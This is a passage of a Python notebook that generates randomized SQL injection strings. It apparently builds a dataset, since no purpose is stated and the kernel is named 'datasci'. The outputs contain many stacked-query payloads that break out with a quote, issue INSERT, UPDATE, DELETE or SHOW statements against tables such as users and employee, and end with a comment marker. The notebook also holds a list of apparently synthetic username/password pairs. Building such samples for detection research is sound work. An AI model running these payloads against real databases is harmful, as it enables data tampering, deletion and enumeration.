    "{\"username\":\"Ava\",\"password\":\"b8K6tH7m\"},{\"username1\":\"Mason\",\"password1\":\"y2Q9uH5t\"},\n",
    "{\"username\":\"Sophia\",\"password\":\"m6J8hK7z\"},{\"username1\":\"Jacob\",\"password1\":\"w8T6pH9g\"},\n",
    "{\"username\":\"Isabella\",\"password\":\"x5P9uN8t\"},{\"username1\":\"William\",\"password1\":\"g8K7tZ9h\"},\n",
    "{\"username\":\"Mia\",\"password\":\"t8J6pH7u\"},{\"username1\":\"Ethan\",\"password1\":\"y9L8kQ5t\"},\n",
    "{\"username\":\"Charlotte\",\"password\":\"m7H9jK8z\"},{\"username1\":\"James\",\"password1\":\"w6T7pH5g\"},\n",
    "{\"username\":\"Amelia\",\"password\":\"x8P6uN7t\"},{\"username1\":\"Alexander\",\"password1\":\"g7K9tZ8h\"},\n",
    "{\"username\":\"Abigail\",\"password\":\"t6J8pH9u\"},{\"username1\":\"Michael\",\"password1\":\"y5L7kQ8t\"},\n",
    "{\"username\":\"Emily\",\"password\":\"m8H6jK9z\"},{\"username1\":\"Benjamin\",\"password1\":\"w7T9pH6g\"},\n",
    "{\"username\":\"Elizabeth\",\"password\":\"x6P8uN5t\"},{\"username1\":\"Matthew\",\"password1\":\"g9K7tZ7h\"},\n",
    "{\"username\":\"Avery\",\"password\":\"t8J9pH6u\"},{\"username1\":\"Daniel\",\"password1\":\"y7L8kQ9t\"},\n",
    "{\"username\":\"Sofia\",\"password\":\"m6H7jK8z\"},{\"username1\":\"Joseph\",\"password1\":\"w5T6pH7g\"},\n",
    "{\"username\":\"Evelyn\",\"password\":\"x9P7uN8t\"},{\"username1\":\"Samuel\",\"password1\":\"g7K8tZ9h\"},\n",
    "{\"username\":\"Aubrey\",\"password\":\"t7J6pH8u\"},{\"username1\":\"Christopher\",\"password1\":\"y8L9kQ7t\"},\n",
    "{\"username\":\"Harper\",\"password\":\"m9H7jK6z\"},{\"username1\":\"Nathan\",\"password1\":\"w6T8pH5g\"},\n",
    "{\"username\":\"Aria\",\"password\":\"x7P9uN7t\"},{\"username1\":\"Ryan\",\"password1\":\"g8K7tZ9h\"},\n",
    "{\"username\":\"Adalynn\",\"password\":\"t6J8pH9u\"},{\"username1\":\"Andrew\",\"password1\":\"y5L7kQ8t\"},\n",
    "{\"username\":\"Ellie\",\"password\":\"m8H6jK9z\"},{\"username1\":\"Oliver\",\"password1\":\"w7T9pH6g\"},\n",
    "{\"username\":\"Scarlett\",\"password\":\"x6P8uN5t\"},{\"username1\":\"Henry\",\"password1\":\"g9K7tZ7h\"},\n",
    "{\"username\":\"Aaliyah\",\"password\":\"t8J9pH6u\"},{\"username1\":\"Jaxon\",\"password1\":\"y7L8kQ9t\"}]\n",
    "\n",
    "\n",
    "def generate_random_string_both() -> str:\n",
    "    length = random.randint(1, 15)\n",
    "    letters = string.ascii_letters + string.digits\n",
    "    return ''.join(random.choice(letters) for i in range(length))\n",
    "\n",
    "def generate_random_string_str() -> str:\n",
    "    length = random.randint(1, 15)\n",
    "    letters = string.ascii_letters\n",
    "    return ''.join(random.choice(letters) for i in range(length))\n",
    "\n",
    "def generate_random_string_tel() -> str:\n",
    "    return \"0\" + str(random.randint(100000000, 999999999))\n",
    "\n",
    "def generate_random_string_id_card() -> str:\n",
    "    return \"1\" + str(random.randint(500000000000, 999999999999))\n",
    "\n",
    "def generate_random_string_price() -> str:\n",
    "    letters = string.digits\n",
    "    return ''.join(random.choice(letters) for i in range(3))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomInsert(table, table_value, last):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        typeOfValue=[]\n",
    "        random_table=table[random.randint(0, len(table)-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        gen.append(\"';\"+\" INSERT INTO \" + random_table + \"(\")\n",
    "        numOfParam=random.randint(1, len(table_value[random_table])-1)\n",
    "        for j in range(numOfParam) :\n",
    "            while True:\n",
    "                random_table_value=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "                if random_table_value not in gen[i]:\n",
    "                    typeOfValue.append(type_of_value[random_table_value])\n",
    "                    break\n",
    "                continue \n",
    "                \n",
    "            gen[i] += random_table_value\n",
    "            if j != numOfParam-1 :\n",
    "                gen[i] += \", \"\n",
    "        gen[i] += \") VALUES(\"\n",
    "        for j in range(numOfParam) :\n",
    "\n",
    "            random_string=\"\"\n",
    "            first = typeOfValue.pop(0)\n",
    "            if first == \"tel\":\n",
    "                random_string = generate_random_string_tel()\n",
    "            elif first == \"price\":\n",
    "                random_string = generate_random_string_price()\n",
    "            elif first == \"id_card\":\n",
    "                random_string = generate_random_string_id_card()\n",
    "            elif first == \"str\":\n",
    "                random_string = generate_random_string_str()\n",
    "            elif first == \"both\":\n",
    "                random_string = generate_random_string_both()\n",
    "                \n",
    "            gen[i] += random_string\n",
    "            if j != numOfParam-1 :\n",
    "                gen[i] += \", \"\n",
    "        gen[i] += \")\" + random_last\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'; INSERT INTO users(username) VALUES(J)-- \",\n",
       " \"'; INSERT INTO users(password) VALUES(zg3xeMg2WkWd6a)#\",\n",
       " \"'; INSERT INTO employee(work_background, fname, lname, employee_id, nickname) VALUES(Blee27mXJk0uj5, DgpzUdZkmLLyM, EO, Y, awdcGLaKohd)-- \",\n",
       " \"'; INSERT INTO employee(address, house_registration, work_background, nickname) VALUES(mcfuKnGJU404Ld, uJw0uRztoAz, StXQjWO3unqAMDN, DkKpT)# \",\n",
       " \"'; INSERT INTO users(password) VALUES(diF8SbRsZbSM)-- \",\n",
       " \"'; INSERT INTO customer(customer_id, tel) VALUES(m7YDj, 0803609663)#\",\n",
       " \"'; INSERT INTO users(password) VALUES(NqmmV)-- \",\n",
       " \"'; INSERT INTO service(price) VALUES(600)# \",\n",
       " \"'; INSERT INTO employee(employee_id, lname, nickname, email, fname) VALUES(rH, CIxdNt, Xj, oVgCYVcd, Vh)# \",\n",
       " \"'; INSERT INTO users(username) VALUES(clkmkimyn)# \"]"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomInsert(table, table_value, last)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomUpdate(table, table_value, last):\n",
    "    gen=[]\n",
    "    for i in range(30) :\n",
    "        typeOfValue=[]\n",
    "        random_table=table[random.randint(0, len(table)-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        gen.append(\"';\" + \" UPDATE \" + random_table + \" SET \")\n",
    "        numOfParam=random.randint(1, len(table_value[random_table])-1)\n",
    "        for j in range(numOfParam) :\n",
    "            while True:\n",
    "                random_table_value=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "                if random_table_value not in gen[i]:\n",
    "                    typeOfValue.append(type_of_value[random_table_value])\n",
    "                    break\n",
    "                continue \n",
    "            \n",
    "            random_string=\"\"\n",
    "            first = typeOfValue.pop(0)\n",
    "            if first == \"tel\":\n",
    "                random_string = generate_random_string_tel()\n",
    "            elif first == \"price\":\n",
    "                random_string = generate_random_string_price()\n",
    "            elif first == \"id_card\":\n",
    "                random_string = generate_random_string_id_card()\n",
    "            elif first == \"str\":\n",
    "                random_string = generate_random_string_str()\n",
    "            elif first == \"both\":\n",
    "                random_string = generate_random_string_both()\n",
    "\n",
    "            gen[i] += random_table_value + \" = \" + random_string\n",
    "            if j != numOfParam-1 :\n",
    "                gen[i] += \", \"\n",
    "        random_table_value2=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "        first2 = type_of_value[random_table_value2]\n",
    "\n",
    "        random_string2=\"\"\n",
    "        if first2 == \"tel\":\n",
    "            random_string2 = generate_random_string_tel()\n",
    "        elif first2 == \"price\":\n",
    "            random_string2 = generate_random_string_price()\n",
    "        elif first2 == \"id_card\":\n",
    "            random_string2 = generate_random_string_id_card()\n",
    "        elif first2 == \"str\":\n",
    "            random_string2 = generate_random_string_str()\n",
    "        elif first2 == \"both\":\n",
    "            random_string2 = generate_random_string_both()\n",
    "            \n",
    "        gen[i] += \" WHERE \" + random_table_value2 + \" = \" + random_string2 +random_last\n",
    "        \n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"'; UPDATE service SET name = HR WHERE name = wwGD-- \",\n",
       " \"'; UPDATE users SET username = rRpObdfQ WHERE username = qsRtsEkJQcL#\",\n",
       " \"'; UPDATE employee SET graduation_certificate = dTDSwyYCQpgNUJ, work_background = NYc8xAHQc5oYZeR, fname = NKrNOoSoBXh, nickname = PwzvkHYztHaw, email = VeBp9BWH, lname = GIU WHERE id_card = 1957531658265# \",\n",
       " \"'; UPDATE employee SET email = CUnwa WHERE lname = DuAfaOyqM-- \",\n",
       " \"'; UPDATE employee SET nickname = IAIUBJgk, employee_id = mcmVDZCr, id_card = 1987217052924, work_background = 689v, graduation_certificate = XGRKyE09kAdSL, address = YSNFHhkytn, fname = QfLazOtMPrvLey, house_registration = BYdbDV WHERE address = kbUQTc# \",\n",
       " \"'; UPDATE service SET price = 880 WHERE name = IBKZfjBHFd-- \",\n",
       " \"'; UPDATE service SET name = gzCjYTnQLYi WHERE price = 827# \",\n",
       " \"'; UPDATE users SET username = DVpovEAZ WHERE password = 5sp-- \",\n",
       " \"'; UPDATE employee SET lname = DZ, prefixname = fVDl, address = H, nickname = rLE, id_card = 1546581740916, work_background = 4ry7Z, employee_id = XqT6Ck, tel = 0704087581, fname = zq WHERE prefixname = zvXqCTiJaLuTDw#\",\n",
       " \"'; UPDATE employee SET prefixname = s, employee_id = fOsGc, email = ROEWZ3, id_card = 1582145875368, fname = WOelaMMFF, house_registration = ZsqXYwl WHERE fname = IivkhRrABfMs#\"]"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomUpdate(table, table_value, last)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomDelete(table, table_value, last):\n",
    "    gen=[]\n",
    "    for i in range(30) :\n",
    "        random_table=table[random.randint(0, len(table)-1)]\n",
    "        random_table_value=table_value[random_table][random.randint(0, len(table_value[random_table])-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        first = type_of_value[random_table_value]\n",
    "        if first == \"tel\":\n",
    "            random_string = generate_random_string_tel()\n",
    "        elif first == \"price\":\n",
    "            random_string = generate_random_string_price()\n",
    "        elif first == \"id_card\":\n",
    "            random_string = generate_random_string_id_card()\n",
    "        elif first == \"str\":\n",
    "            random_string = generate_random_string_str()\n",
    "        elif first == \"both\":\n",
    "            random_string = generate_random_string_both()\n",
    "        \n",
    "        gen.append(''' \"; ''' +\"DELETE FROM \" + random_table + \" WHERE \" + random_table_value + \" = \" + random_string +random_last)\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\"; DELETE FROM employee WHERE prefixname = KPcqs# ',\n",
       " '\"; DELETE FROM customer WHERE fname = SGwbOYihAEXeHAk#',\n",
       " '\"; DELETE FROM employee WHERE fname = mkLFwlmadsamnci# ',\n",
       " '\"; DELETE FROM employee WHERE address = UboLZw# ',\n",
       " '\"; DELETE FROM customer WHERE lname = w#',\n",
       " '\"; DELETE FROM employee WHERE fname = Eoz#',\n",
       " '\"; DELETE FROM users WHERE password = 98hkNztci5vH-- ',\n",
       " '\"; DELETE FROM users WHERE password = ueIgWjaDNQ-- ',\n",
       " '\"; DELETE FROM employee WHERE prefixname = mq# ',\n",
       " '\"; DELETE FROM customer WHERE lname = gPApGm-- ',\n",
       " '\"; DELETE FROM users WHERE password = krB#',\n",
       " '\"; DELETE FROM users WHERE password = 3cGHMYWeP# ',\n",
       " '\"; DELETE FROM users WHERE password = X43Hc# ',\n",
       " '\"; DELETE FROM customer WHERE lname = GEFnDGdOSu#',\n",
       " '\"; DELETE FROM customer WHERE customer_id = LxrZiBSnrsQgxx-- ',\n",
       " '\"; DELETE FROM users WHERE username = TdE-- ',\n",
       " '\"; DELETE FROM customer WHERE lname = ePCHrnmv-- ',\n",
       " '\"; DELETE FROM service WHERE price = 542#',\n",
       " '\"; DELETE FROM users WHERE username = gyeSZ# ',\n",
       " '\"; DELETE FROM users WHERE username = jlfkFMLrrwDyT-- ',\n",
       " '\"; DELETE FROM users WHERE password = TPsMf-- ',\n",
       " '\"; DELETE FROM employee WHERE work_background = C6#',\n",
       " '\"; DELETE FROM employee WHERE prefixname = KUeixAMt-- ',\n",
       " '\"; DELETE FROM service WHERE name = bXIRNP#',\n",
       " '\"; DELETE FROM customer WHERE tel = 0126388787#',\n",
       " '\"; DELETE FROM customer WHERE customer_id = WgG3B9abx8#',\n",
       " '\"; DELETE FROM customer WHERE email = ySPtv-- ',\n",
       " '\"; DELETE FROM customer WHERE email = JuabcgK-- ',\n",
       " '\"; DELETE FROM users WHERE username = PrruSWPDzmL# ',\n",
       " '\"; DELETE FROM customer WHERE customer_id = 9ic5Ma3pPZOs4oI# ']"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomDelete(table, table_value, last)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "def randomShow(showList, last):\n",
    "    gen=[]\n",
    "    for i in range(10) :\n",
    "        random_show=showList[random.randint(0, len(showList)-1)]\n",
    "        random_last=last[random.randint(0, len(last)-1)]\n",
    "        gen.append(\"\\\"; \" + \"SHOW \" + random_show + random_last)\n",
    "    return gen"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\"; SHOW DATABASES#',\n",
       " '\"; SHOW COLUME#',\n",
       " '\"; SHOW DATABASES# ',\n",
       " '\"; SHOW TABLES#',\n",
       " '\"; SHOW DATABASES# ',\n",
       " '\"; SHOW COLUME-- ',\n",
       " '\"; SHOW COLUME#',\n",
       " '\"; SHOW DATABASES-- ',\n",
       " '\"; SHOW DATABASES# ',\n",
       " '\"; SHOW COLUME# ']"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "randomShow(showList, last)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "datasci",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "d02408f7d0b186b278dce98dbda3e2a19eb86dadebeae0544dfa290f0f6e42cc"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
